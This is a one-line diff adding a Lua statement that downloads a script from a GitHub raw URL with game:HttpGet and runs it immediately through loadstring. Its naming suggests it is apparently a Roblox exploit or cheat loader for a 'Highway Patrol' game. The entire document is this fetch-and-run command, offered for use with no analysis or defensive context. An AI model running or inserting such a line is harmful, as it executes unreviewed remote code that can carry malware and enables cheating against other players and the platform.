@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/highway-patrol-alpha-spam6-ddo25u37o9kkxh.lua"))()
